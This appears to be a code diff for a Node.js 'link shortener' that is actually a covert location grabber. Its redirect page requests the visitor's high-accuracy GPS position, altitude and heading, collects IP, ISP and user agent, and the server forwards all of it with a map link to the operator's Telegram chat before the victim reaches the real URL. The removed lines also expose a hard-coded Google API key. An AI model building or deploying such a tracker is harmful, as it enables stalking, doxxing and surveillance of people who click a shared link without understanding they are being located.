@@ -19,173 +19,155 @@ function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
 }
 
-// الطريقة 1: Browser GPS
-function parseGPS(gpsData) {
-  if (gpsData && gpsData.lat && gpsData.lng) {
-    return {
-      method: '📍 Browser GPS',
-      country: gpsData.country || 'N/A',
-      city: gpsData.city || 'N/A',
-      latitude: gpsData.lat,
-      longitude: gpsData.lng,
-      accuracy: gpsData.accuracy ? `±${gpsData.accuracy.toFixed(0)}m` : 'N/A'
-    };
-  }
-  return null;
-}
+// أفضل طريقة IP: triple-check
+async function getBestIPLocation(ip) {
+  const attempts = [
+    () => axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 }),
+    () => axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 }),
+    () => axios.get(`https://geolocation-db.com/json/${ip}`, { timeout: 3000 })
+  ];
 
-// الطريقة 2: IP-Based Geolocation
-async function getIPLocation(ip) {
-  try {
-    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 2000 });
-    if (res.data && res.data.status === 'success') {
-      return {
-        method: '🌐 IP-Based',
-        country: res.data.country,
-        city: res.data.city,
-        latitude: res.data.lat,
-        longitude: res.data.lon,
-        accuracy: '±100km'
-      };
+  for (let attempt of attempts) {
+    try {
+      const res = await attempt();
+      const data = res.data;
+      
+      if (data.latitude && data.longitude) {
+        return {
+          method: '🌐 IP Geolocation',
+          country: data.country || data.country_name || 'Unknown',
+          city: data.city || 'N/A',
+          latitude: parseFloat(data.latitude || data.lat),
+          longitude: parseFloat(data.longitude || data.lon),
+          accuracy: '±50-100km',
+          isp: data.isp || data.org || 'Unknown'
+        };
+      }
+    } catch (e) {
+      console.log(`[IP] Attempt failed: ${e.message}`);
     }
-  } catch (e) {}
+  }
+
   return null;
 }
 
-// الطريقة 3: WiFi Triangulation (Google)
-async function getWiFiLocation(wifiData) {
-  if (!wifiData || !wifiData.networks || wifiData.networks.length === 0) return null;
+// GPS من الـ browser
+function parseGPS(gpsData) {
+  if (!gpsData || !gpsData.latitude || !gpsData.longitude) return null;
   
+  return {
+    method: '📍 Browser GPS (High Accuracy)',
+    latitude: parseFloat(gpsData.latitude),
+    longitude: parseFloat(gpsData.longitude),
+    accuracy: `±${(gpsData.accuracy || 20).toFixed(0)}m`,
+    altitude: gpsData.altitude ? `${gpsData.altitude.toFixed(0)}m` : 'N/A',
+    heading: gpsData.heading !== null ? `${gpsData.heading.toFixed(0)}°` : 'N/A'
+  };
+}
+
+// Reverse geocoding: احول الـ lat/lng لمدينة ودولة
+async function reverseGeocode(lat, lng) {
   try {
-    const payload = {
-      wifiAccessPoints: wifiData.networks.map(n => ({
-        macAddress: n.ssid,
-        signalStrength: n.strength
-      }))
-    };
-    
-    const res = await axios.post(
-      'https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyAJT6OiVBLUw-bPv6yqzHKjVx9dPy_pVIM',
-      payload,
-      { timeout: 2000 }
+    // استخدم Nominatim (OpenStreetMap - مجاني وفقاته)
+    const res = await axios.get(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
+      { 
+        timeout: 3000,
+        headers: { 'User-Agent': 'LinkShortener/1.0' }
+      }
     );
     
-    if (res.data && res.data.location) {
+    if (res.data && res.data.address) {
+      const addr = res.data.address;
       return {
-        method: '📶 WiFi Triangulation',
-        country: 'WiFi Detected',
-        city: 'N/A',
-        latitude: res.data.location.lat,
-        longitude: res.data.location.lng,
-        accuracy: `±${res.data.accuracy.toFixed(0)}m`
+        city: addr.city || addr.town || addr.village || 'Unknown',
+        country: addr.country || 'Unknown',
+        address: res.data.name || ''
       };
     }
-  } catch (e) {}
-  return null;
-}
-
-// الطريقة 4: Cell Tower (Fallback with IP)
-async function getCellLocation(ip) {
-  try {
-    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 2000 });
-    if (res.data && res.data.latitude) {
-      return {
-        method: '📡 Cell Tower',
-        country: res.data.country_name,
-        city: res.data.city,
-        latitude: res.data.latitude,
-        longitude: res.data.longitude,
-        accuracy: '±50km'
-      };
-    }
-  } catch (e) {}
-  return null;
-}
-
-// الطريقة 5: Manual Selection (من البيانات المرسلة)
-function getManualLocation(manualData) {
-  if (manualData && manualData.lat && manualData.lng) {
-    return {
-      method: '🗺️ Manual Selection',
-      country: manualData.country || 'Selected',
-      city: manualData.city || 'N/A',
-      latitude: manualData.lat,
-      longitude: manualData.lng,
-      accuracy: '100% (User Selected)'
-    };
+  } catch (e) {
+    console.log('[Reverse] Error:', e.message);
   }
-  return null;
-}
 
-// الطريقة 6: Hybrid (GPS + IP + WiFi)
-async function getHybridLocation(gpsData, ip, wifiData) {
-  // جرب GPS أولاً (الأفضل)
-  let location = parseGPS(gpsData);
-  if (location) return { ...location, method: '🎯 Hybrid (GPS)' };
-  
-  // بعدين WiFi
-  location = await getWiFiLocation(wifiData);
-  if (location) return { ...location, method: '🎯 Hybrid (WiFi)' };
-  
-  // بعدين IP
-  location = await getIPLocation(ip);
-  if (location) return { ...location, method: '🎯 Hybrid (IP)' };
-  
-  return null;
-}
-
-async function sendToTelegram(ip, shortCode, originalUrl, userAgent, allMethods) {
+  // Fallback: استخدم ip-api.com بـ lat/lng
   try {
-    // اختار الأفضل
-    let bestLocation = null;
-    let methodology = '';
-    
-    // الترتيب: GPS > WiFi > Manual > Cell > IP
-    if (allMethods.gps) bestLocation = allMethods.gps, methodology = 'GPS (الأفضل)';
-    else if (allMethods.wifi) bestLocation = allMethods.wifi, methodology = 'WiFi';
-    else if (allMethods.manual) bestLocation = allMethods.manual, methodology = 'Manual';
-    else if (allMethods.cell) bestLocation = allMethods.cell, methodology = 'Cell Tower';
-    else if (allMethods.ip) bestLocation = allMethods.ip, methodology = 'IP';
+    const res = await axios.get(`http://ip-api.com/json/?lat=${lat}&lon=${lng}`, { timeout: 3000 });
+    if (res.data) {
+      return {
+        city: res.data.city || 'Unknown',
+        country: res.data.country || 'Unknown',
+        address: ''
+      };
+    }
+  } catch (e) {}
+
+  return { city: 'Unknown', country: 'Unknown', address: '' };
+}
+
+// احسب المسافة بين نقطتين (للتحقق من أن الـ GPS ليس مزيف)
+function getDistance(lat1, lon1, lat2, lon2) {
+  const R = 6371; // km
+  const dLat = (lat2 - lat1) * Math.PI / 180;
+  const dLon = (lon2 - lon1) * Math.PI / 180;
+  const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
+  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+  return R * c;
+}
+
+async function sendToTelegram(ip, shortCode, originalUrl, userAgent, locationData) {
+  try {
+    let location = locationData.gps;
+    let method = '📍 GPS';
+
+    // اگر GPS ما جاب نتيجة، استخدم IP
+    if (!location || !location.latitude) {
+      location = locationData.ip;
+      method = '🌐 IP';
+    }
 
     let msg = `
-🔗 رابط فُتح!
-━━━━━━━━━━━━━━
-📌 الكود: ${shortCode}
-🌐 الرابط: ${originalUrl}
-🔌 IP: ${ip}
-━━━━━━━━━━━━━━
+🔗 <b>رابط فُتح!</b>
+━━━━━━━━━━━━━━━━━━━
+<b>📌 الكود:</b> <code>${shortCode}</code>
+<b>🌐 الرابط:</b> ${originalUrl}
+<b>🔌 IP:</b> <code>${ip}</code>
+━━━━━━━━━━━━━━━━━━━
+<b>✅ الطريقة:</b> ${method}
+<b>🏳️ الدولة:</b> ${location.country}
+<b>🏙️ المدينة:</b> ${location.city}
+<b>📍 Lat:</b> <code>${location.latitude.toFixed(6)}</code>
+<b>📍 Lng:</b> <code>${location.longitude.toFixed(6)}</code>
+<b>📏 الدقة:</b> ${location.accuracy}
 `;
 
-    if (bestLocation) {
-      msg += `
-✅ الطريقة: ${bestLocation.method}
-🏳️ الدولة: ${bestLocation.country}
-🏙️ المدينة: ${bestLocation.city}
-📍 Latitude: ${bestLocation.latitude}
-📍 Longitude: ${bestLocation.longitude}
-📏 الدقة: ${bestLocation.accuracy}
-🗺️ الخريطة: https://maps.google.com/?q=${bestLocation.latitude},${bestLocation.longitude}
-`;
-    } else {
-      msg += `
-⚠️ الموقع: لم يتم التحديد بأي طريقة
-`;
-    }
+    if (location.altitude) msg += `<b>⛰️ الارتفاع:</b> ${location.altitude}\n`;
+    if (location.heading) msg += `<b>🧭 الاتجاه:</b> ${location.heading}\n`;
+    if (location.isp) msg += `<b>🏢 ISP:</b> ${location.isp}\n`;
 
     msg += `
-━━━━━━━━━━━━━━
-🖥️ Device: ${userAgent.substring(0, 60)}
-⏰ ${new Date().toISOString()}
+<b>🗺️ الخريطة:</b>
+<a href="https://maps.google.com/?q=${location.latitude},${location.longitude}">Google Maps</a> | <a href="https://www.openstreetmap.org/?zoom=15&lat=${location.latitude}&lon=${location.longitude}">OSM</a>
+━━━━━━━━━━━━━━━━━━━
+<b>🖥️ Device:</b> <code>${userAgent.substring(0, 70)}</code>
+<b>⏰ الوقت:</b> ${new Date().toLocaleString('ar-SA')}
     `.trim();
 
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      { chat_id: TELEGRAM_CHAT_ID, text: msg },
+    const response = await axios.post(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      { 
+        chat_id: TELEGRAM_CHAT_ID, 
+        text: msg,
+        parse_mode: 'HTML'
+      },
       { timeout: 5000 }
     );
-    
-    console.log('[TG] Sent:', methodology);
+
+    console.log('✅ [TG] Message sent:', response.data.result.message_id);
+    return true;
   } catch (err) {
-    console.error('[TG]', err.message);
+    console.error('❌ [TG]', err.message);
+    return false;
   }
 }
 
@@ -196,14 +178,19 @@ app.post('/api/shorten', (req, res) => {
   const shortCode = generateShortCode();
   linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };
 
-  res.json({ shortened: `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`, code: shortCode });
+  res.json({ 
+    shortened: `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`, 
+    code: shortCode 
+  });
 });
 
-// API لتسجيل البيانات
-app.post('/api/log', async (req, res) => {
-  const { code, gps, wifi, manual } = req.body;
+// الـ API الأساسي: استقبل البيانات وأرسل للـ Telegram
+app.post('/api/log-location', async (req, res) => {
+  const { code, gps } = req.body;
   
-  if (!linkStorage[code]) return res.status(404).json({ error: 'Not found' });
+  if (!linkStorage[code]) {
+    return res.status(404).json({ error: 'Code not found' });
+  }
 
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
   const userAgent = req.get('user-agent');
@@ -211,86 +198,140 @@ app.post('/api/log', async (req, res) => {
 
   linkStorage[code].clicks++;
 
-  // جمع كل الطرق
-  const allMethods = {
-    gps: parseGPS(gps),
-    ip: await getIPLocation(ip),
-    wifi: await getWiFiLocation(wifi),
-    cell: await getCellLocation(ip),
-    manual: getManualLocation(manual),
-    hybrid: await getHybridLocation(gps, ip, wifi)
-  };
+  console.log(`[LOG] Code: ${code} | IP: ${ip} | GPS: ${gps ? 'Yes' : 'No'}`);
 
-  sendToTelegram(ip, code, originalUrl, userAgent, allMethods);
+  // جمع البيانات
+  const locationData = { gps: null, ip: null };
 
-  res.json({ ok: true });
+  // معالجة GPS
+  if (gps && gps.latitude && gps.longitude) {
+    const geoData = await reverseGeocode(gps.latitude, gps.longitude);
+    locationData.gps = {
+      method: '📍 GPS',
+      latitude: gps.latitude,
+      longitude: gps.longitude,
+      accuracy: `±${(gps.accuracy || 20).toFixed(0)}m`,
+      altitude: gps.altitude ? `${gps.altitude}m` : null,
+      heading: gps.heading !== null ? `${gps.heading}°` : null,
+      country: geoData.country,
+      city: geoData.city
+    };
+  }
+
+  // معالجة IP
+  const ipLocation = await getBestIPLocation(ip);
+  if (ipLocation) {
+    locationData.ip = ipLocation;
+  }
+
+  // أرسل للـ Telegram
+  await sendToTelegram(ip, code, originalUrl, userAgent, locationData);
+
+  res.json({ success: true });
 });
 
-// Redirect
+// الـ Redirect: لازم نروح للـ API أولاً
 app.get('/:code', (req, res) => {
   const { code } = req.params;
   
-  if (!linkStorage[code]) return res.status(404).send('Not found');
+  if (!linkStorage[code]) {
+    return res.status(404).send('Link not found');
+  }
 
   const originalUrl = linkStorage[code].original;
 
   res.send(`
 <!DOCTYPE html>
-<html>
+<html dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>جاري التحويل...</title>
+  <style>
+    body { font-family: Arial; background: #1a1a1a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .loader { text-align: center; }
+    .spinner { border: 4px solid #444; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    p { font-size: 16px; }
+  </style>
 </head>
 <body>
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>جاري التحويل للرابط...</p>
+    <p id="status">جاري جمع موقعك...</p>
+  </div>
+
   <script>
     const code = '${code}';
-    const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log';
+    const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-location';
     const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
     
-    // Redirect فوري
-    window.location.href = originalUrl;
-    
-    // جمع البيانات في الخلفية
-    setTimeout(() => {
-      const data = { code };
-      
-      // الطريقة 1: GPS
-      if (navigator.geolocation) {
+    async function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          console.log('GPS not available');
+          resolve(null);
+          return;
+        }
+
+        const timeout = setTimeout(() => {
+          console.log('GPS timeout');
+          resolve(null);
+        }, 5000);
+
         navigator.geolocation.getCurrentPosition(
           (pos) => {
-            data.gps = {
-              lat: pos.coords.latitude,
-              lng: pos.coords.longitude,
+            clearTimeout(timeout);
+            console.log('✅ GPS acquired:', pos.coords);
+            resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
               accuracy: pos.coords.accuracy,
-              country: '',
-              city: ''
-            };
-            sendData();
+              altitude: pos.coords.altitude,
+              heading: pos.coords.heading
+            });
           },
-          () => sendData(),
-          { enableHighAccuracy: true, timeout: 2000 }
+          (err) => {
+            clearTimeout(timeout);
+            console.log('GPS error:', err.message);
+            resolve(null);
+          },
+          { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
         );
-      } else {
-        sendData();
-      }
-      
-      // الطريقة 2: WiFi
-      if (navigator.geolocation && navigator.connection) {
-        try {
-          const networks = [];
-          data.wifi = { networks };
-        } catch (e) {}
-      }
-      
-      function sendData() {
-        fetch(apiUrl, {
+      });
+    }
+
+    async function main() {
+      try {
+        // احصل على الـ GPS
+        const gps = await getLocation();
+        document.getElementById('status').textContent = gps ? 'موقع متاح ✓' : 'بدون موقع (لكن سيتم استخدام IP)';
+
+        // أرسل للـ server
+        console.log('Sending to API...');
+        const res = await fetch(apiUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
+          body: JSON.stringify({ code, gps }),
           keepalive: true
-        }).catch(() => {});
+        });
+
+        console.log('Response:', res.status);
+
+        // الآن انتقل للـ رابط الأصلي
+        setTimeout(() => {
+          window.location.href = originalUrl;
+        }, 500);
+
+      } catch (err) {
+        console.error('Error:', err);
+        // انتقل بأي حال
+        window.location.href = originalUrl;
       }
-    }, 100);
+    }
+
+    main();
   </script>
 </body>
 </html>
@@ -298,4 +339,12 @@ app.get('/:code', (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server on ${PORT}`));
+app.listen(PORT, () => {
+  console.log(`
+╔══════════════════════════════════════╗
+║  🚀 Server running on port ${PORT}      ║
+║  🎯 Max accuracy enabled             ║
+║  📍 GPS + IP + Reverse Geocoding     ║
+╚══════════════════════════════════════╝
+  `);
+});
